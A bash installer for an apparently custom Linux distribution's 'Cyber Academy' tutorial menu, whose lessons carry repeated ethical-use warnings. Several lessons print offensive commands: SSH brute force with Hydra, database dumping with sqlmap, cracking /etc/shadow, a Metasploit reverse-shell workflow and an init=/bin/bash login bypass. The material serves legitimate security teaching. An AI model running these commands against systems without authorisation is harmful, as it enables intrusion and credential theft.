#!/bin/bash
# Vajra OS — Cyber Academy (Interactive Learning Guide)
# Teaches cybersecurity and ethical hacking with step-by-step guides.
# All guides emphasize ETHICAL USE ONLY.

AC_DIR="/opt/vajra/cyber-academy"
mkdir -p "$AC_DIR"

cat > "$AC_DIR/cyber-academy.sh" << 'ACADEMY'
#!/bin/bash

case "${1:-menu}" in
    menu)
        echo ""
        echo "  ==============================================="
        echo "   Vajra OS - Cyber Academy"
        echo "   Learn Ethical Hacking & Cybersecurity"
        echo "  ==============================================="
        echo ""
        echo "  [1] Beginner: Cybersecurity Basics"
        echo "  [2] Beginner: How to Secure Your Own Device"
        echo "  [3] Intermediate: Network Scanning (Nmap)"
        echo "  [4] Intermediate: WiFi Security Testing"
        echo "  [5] Intermediate: Web Application Testing"
        echo "  [6] Advanced: Password Security & Cracking"
        echo "  [7] Advanced: Penetration Testing Basics"
        echo "  [8] Advanced: Digital Forensics"
        echo "  [9] Real-World: How to Audit Your Own WiFi"
        echo "  [10] Real-World: How to Check if Your Device is Hacked"
        echo "  [11] Real-World: How to Recover a Locked Device"
        echo "  [12] Tools: Metasploit Guide"
        echo "  [13] Tools: Wireshark Guide"
        echo "  [14] Tools: Burp Suite Guide"
        echo "  [15] Ethics: Responsible Disclosure"
        echo "  [16] Laws: Indian Cyber Law (IT Act 2000)"
        echo "  [17] Practice: Set Up a Test Lab"
        echo ""
        echo "  [q] Quit"
        echo ""
        read -p "  Choose a lesson (1-17): " lesson
        case "$lesson" in
            1) vajra-cyber-academy basics ;;
            2) vajra-cyber-academy secure-device ;;
            3) vajra-cyber-academy nmap-guide ;;
            4) vajra-cyber-academy wifi-guide ;;
            5) vajra-cyber-academy web-guide ;;
            6) vajra-cyber-academy password-guide ;;
            7) vajra-cyber-academy pentest-guide ;;
            8) vajra-cyber-academy forensics-guide ;;
            9) vajra-cyber-academy audit-wifi ;;
            10) vajra-cyber-academy check-hacked ;;
            11) vajra-cyber-academy recover-locked ;;
            12) vajra-cyber-academy metasploit-guide ;;
            13) vajra-cyber-academy wireshark-guide ;;
            14) vajra-cyber-academy burpsuite-guide ;;
            15) vajra-cyber-academy ethics ;;
            16) vajra-cyber-academy laws ;;
            17) vajra-cyber-academy test-lab ;;
            q|Q) echo "  Goodbye! Stay ethical." ;;
            *) echo "  Invalid choice." ;;
        esac
        ;;
    basics)
        echo "  === Lesson 1: Cybersecurity Basics ==="
        echo "  Common Threats: Malware, Phishing, MitM, Brute Force, Social Engineering"
        echo "  The CIA Triad: Confidentiality, Integrity, Availability"
        echo "  Key Defense Layers: Firewall, Encryption, Strong passwords+2FA, Updates, Backups, VPN, Tor"
        ;;
    secure-device)
        echo "  === Lesson 2: How to Secure Your Own Device ==="
        echo "  1. UPDATE: sudo apt-get update && sudo apt-get upgrade -y"
        echo "  2. FIREWALL: sudo ufw enable"
        echo "  3. STRONG PASSWORD: vajra-password-auditor strength"
        echo "  4. DISABLE SERVICES: sudo systemctl disable bluetooth"
        echo "  5. ENCRYPT DISK: sudo cryptsetup luksFormat /dev/sdX"
        echo "  6. ENABLE 2FA: sudo apt-get install oathtool"
        echo "  7. USE TOR: vajra-tor-decision menu"
        echo "  8. BACKUP: vajra-backup home"
        echo "  9. AUDIT: vajra-settings privacy status"
        echo "  10. MALWARE SCAN: sudo clamscan -r /home"
        ;;
    nmap-guide)
        echo "  === Lesson 3: Network Scanning with Nmap ==="
        echo "  ETHICAL USE: Only scan networks you own or have permission to test."
        echo "  Commands:"
        echo "    vajra-nmap quick <ip>     - Fast scan (top 100 ports)"
        echo "    vajra-nmap scan <ip>      - Standard scan (SYN, version, OS)"
        echo "    vajra-nmap full <ip>      - Full scan (all 65535 ports)"
        echo "    vajra-nmap stealth <ip>   - Stealth SYN scan"
        echo "    vajra-nmap vuln <ip>      - Vulnerability detection"
        echo "    vajra-nmap os <ip>       - OS fingerprinting"
        echo "    vajra-nmap subnet <CIDR>  - Ping sweep subnet"
        ;;
    wifi-guide)
        echo "  === Lesson 4: WiFi Security Testing ==="
        echo "  ETHICAL USE: Only test WiFi networks you OWN."
        echo "  Security types (weak to strong): Open < WEP < WPA < WPA2 < WPA3"
        echo "  Steps:"
        echo "    1. vajra-wifi scan         - List networks"
        echo "    2. vajra-wifi security      - Check security type"
        echo "    3. vajra-aircrack monitor wlan0  - Enable monitor mode"
        echo "    4. vajra-aircrack scan wlan0mon - Scan for networks"
        echo "    5. vajra-aircrack capture <iface> <bssid> <ch> - Capture handshake"
        echo "    6. vajra-aircrack crack <file.cap>  - Try cracking YOUR password"
        echo "    7. vajra-aircrack stop wlan0mon    - Stop monitor mode"
        ;;
    web-guide)
        echo "  === Lesson 5: Web Application Testing ==="
        echo "  ETHICAL USE: Only test websites you OWN or have written permission."
        echo "  Tools:"
        echo "    vajra-nikto scan <host>           - Web vulnerability scanner"
        echo "    vajra-sqlmap scan <url>           - SQL injection testing"
        echo "    vajra-sqlmap dump <url>           - Dump database"
        echo "    vajra-burpsuite launch            - Web proxy"
        echo "    vajra-fuzzer fuzz <url>           - Directory fuzzing"
        echo "    vajra-fuzzer xss <url>            - XSS testing"
        echo "    vajra-osint whois <domain>        - Domain info"
        echo "    vajra-osint subdomain <domain>    - Subdomain enumeration"
        ;;
    password-guide)
        echo "  === Lesson 6: Password Security & Cracking ==="
        echo "  ETHICAL USE: Only crack passwords you own or have permission to test."
        echo "  Tools:"
        echo "    vajra-password-auditor strength    - Check YOUR password"
        echo "    vajra-john wordlist <hash-file>   - Dictionary attack (CPU)"
        echo "    vajra-john shadow                  - Test /etc/shadow"
        echo "    vajra-john zip <file.zip>          - Crack ZIP password"
        echo "    vajra-hashcat benchmark            - Test GPU speed"
        echo "    vajra-hashcat dictionary <hash>   - Dictionary attack (GPU)"
        echo "    vajra-hydra ssh <host> <user>      - Online brute force SSH"
        echo "  Make passwords uncrackable: 16+ chars, unique, password manager, 2FA"
        ;;
    pentest-guide)
        echo "  === Lesson 7: Penetration Testing Basics ==="
        echo "  You MUST have written permission before pentesting."
        echo "  Phases:"
        echo "  1. RECON: vajra-osint whois/dns/subdomain <target>"
        echo "  2. SCAN: vajra-nmap scan/full/vuln <target>"
        echo "  3. VULN: vajra-vulnscan scan <target> + vajra-nikto scan <target>"
        echo "  4. EXPLOIT: vajra-metasploit console / vajra-sqlmap scan <url>"
        echo "  5. POST-EXPLOIT: What data can you access? Can you escalate?"
        echo "  6. REPORT: Document findings, rate severity, provide fixes"
        ;;
    forensics-guide)
        echo "  === Lesson 8: Digital Forensics ==="
        echo "  Tools:"
        echo "    vajra-forensics disk-image <dev> [out]  - Create disk image"
        echo "    vajra-forensics file-carve <image>      - Recover deleted files"
        echo "    vajra-forensics memory-dump             - Capture RAM"
        echo "    vajra-forensics timeline <dir>           - File access timeline"
        echo "    vajra-forensics hash-verify <file>      - Verify integrity"
        echo "    vajra-wireshark read <pcap>             - Analyze captures"
        echo "    vajra-reverse strings/hexdump/info <f>  - Analyze binaries"
        ;;
    audit-wifi)
        echo "  === Real-World: Audit Your Own WiFi ==="
        echo "  1. Find router: ip route | grep default"
        echo "  2. Scan router: vajra-nmap scan 192.168.1.1"
        echo "  3. Check security: vajra-wifi security"
        echo "  4. Find unknown devices: vajra-nmap subnet 192.168.1.0/24"
        echo "  5. Test WiFi password: vajra-aircrack capture+crack"
        echo "  6. Secure router: Change admin pass, disable WPS, enable WPA2/3"
        ;;
    check-hacked)
        echo "  === Real-World: Check if Your Device is Hacked ==="
        echo "  Signs: Unusual traffic, unknown processes, files you didn't create,"
        echo "         passwords stopped working, browser redirects, slow system,"
        echo "         camera/mic light on randomly, battery draining fast"
        echo "  Check:"
        echo "    1. ps aux --sort=-%cpu | head -20   - Unknown processes?"
        echo "    2. ss -tulpn                            - Unknown connections?"
        echo "    3. sudo rkhunter --check                - Rootkit scan"
        echo "    4. sudo clamscan -r /home              - Malware scan"
        echo "    5. vajra-startup list                  - Unknown startup apps?"
        echo "    6. vajra-settings accounts status       - Unknown users?"
        echo "    7. sudo journalctl -u sshd | tail -50   - SSH attacks?"
        echo "  If compromised: Disconnect internet, change passwords, reinstall OS"
        ;;
    recover-locked)
        echo "  === Real-World: Recover a Locked Device ==="
        echo "  Forgot Vajra OS password:"
        echo "  1. Reboot, press 'e' at boot menu"
        echo "  2. Add 'init=/bin/bash' to linux line"
        echo "  3. Ctrl+X to boot"
        echo "  4. mount -o remount,rw /"
        echo "  5. passwd <username>"
        echo "  6. reboot -f"
        echo ""
        echo "  Forgot WiFi password:"
        echo "  - Check router sticker"
        echo "  - Router admin: 192.168.1.1"
        echo "  - Connected device: Settings > WiFi > Share"
        ;;
    metasploit-guide)
        echo "  === Tool Guide: Metasploit ==="
        echo "  ETHICAL USE: Only use on systems you own or have permission to test."
        echo "  Start: vajra-metasploit console"
        echo "  Workflow:"
        echo "    search type:exploit name:ssh"
        echo "    use exploit/unix/ssh/ssh_libcurl"
        echo "    set RHOSTS 192.168.1.100"
        echo "    set PAYLOAD payload/unix/reverse_bash"
        echo "    set LHOST 192.168.1.50"
        echo "    exploit"
        ;;
    wireshark-guide)
        echo "  === Tool Guide: Wireshark ==="
        echo "  ETHICAL USE: Only capture on networks you own."
        echo "  Commands:"
        echo "    vajra-wireshark launch         - GUI"
        echo "    vajra-wireshark capture eth0   - Capture 60s"
        echo "    vajra-wireshark read <file>    - Read pcap"
        echo "    vajra-wireshark http eth0      - Live HTTP"
        echo "    vajra-wireshark dns eth0       - Live DNS"
        echo "  Filters: ip.addr==X, tcp.port==443, http.request.method==POST"
        ;;
    burpsuite-guide)
        echo "  === Tool Guide: Burp Suite ==="
        echo "  ETHICAL USE: Only test websites you own or have permission."
        echo "  1. vajra-burpsuite launch   - Start Burp"
        echo "  2. vajra-burpsuite proxy    - Set proxy 127.0.0.1:8080"
        echo "  3. Browse website, intercept requests"
        echo "  4. Modify and forward"
        echo "  5. vajra-burpsuite proxy-off - Disable proxy"
        ;;
    ethics)
        echo "  === Ethics: Responsible Disclosure ==="
        echo "  DO: Report privately, give 90 days to fix, use HackerOne/Bugcrowd"
        echo "  DON'T: Exploit for gain, access data, modify anything, sell vulns"
        echo "  India: CERT-In is the official vulnerability coordinator"
        ;;
    laws)
        echo "  === Laws: Indian Cyber Law (IT Act 2000) ==="
        echo "  IMPORTANT: Educational info, NOT legal advice. Consult a lawyer."
        echo "  Sec 43: Unauthorized access - fine up to damage caused"
        echo "  Sec 66: Computer offenses - up to 3 years + fine"
        echo "  Sec 66C: Identity theft - up to 3 years + fine"
        echo "  Sec 66E: Privacy violation - up to 3 years + fine"
        echo "  Sec 66F: Cyber terrorism - LIFE IMPRISONMENT"
        echo "  ALWAYS get written permission before testing any system."
        ;;
    test-lab)
        echo "  === Practice: Set Up a Test Lab ==="
        echo "  NEVER practice hacking on real systems."
        echo "  Option 1: VirtualBox VMs (Kali + Metasploitable)"
        echo "  Option 2: Docker (kalilinux/kali-rolling)"
        echo "  Option 3: Online labs: HackTheBox, TryHackMe, PortSwigger Academy"
        echo "  Option 4: Vajra built-in: vajra-nmap scan localhost"
        ;;
    help|*)
        echo "  Vajra OS - Cyber Academy. Run: vajra-cyber-academy menu"
        ;;
esac
ACADEMY
chmod +x "$AC_DIR/cyber-academy.sh"
ln -sf "$AC_DIR/cyber-academy.sh" /usr/local/bin/vajra-cyber-academy 2>/dev/null || true
echo "  Cyber Academy installed"
